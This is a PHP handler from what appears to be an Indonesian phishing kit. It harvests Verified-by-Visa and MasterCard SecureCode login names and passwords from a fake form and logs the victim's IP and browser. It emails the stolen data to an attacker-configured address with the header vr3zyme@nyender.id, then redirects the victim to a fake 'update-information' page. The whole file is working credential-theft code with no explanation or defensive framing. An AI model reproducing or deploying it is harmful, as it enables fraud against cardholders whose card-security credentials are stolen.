<?php

include('../../blocker.php');
include('../../detect.php');
//+++++++++++++++++++++++++++++++\\ HARTA TAHATA WANITA //+++++++++++++++++++++++++++++++\\
$message ="
++-----[ $$ [-] Cikampek-T34m [-]  $$ ]-----++

      .++=====[ VBV - MCSC - J/SECURE ]=====++.

Credit Login    :  " . $_POST['cc_login'] . "
Credit Pass     :  " . $_POST['cc_pass'] . "
      .++=========[ End ]=========++.

      .++=======[ PC Info ]=======++.
From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++=========[ End ]=========++.

++-----[ $$ [N]e[V]e[R] [GIVE UP] $$ ]-----++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\

include('../../your_email.php');
$subject = "VBV  [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: VBV <vr3zyme@nyender.id>";
mail($nyenderid, $subject, $message, $headers);


header("LOCATION: webscrr?cmd=_update-information&account_bank=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>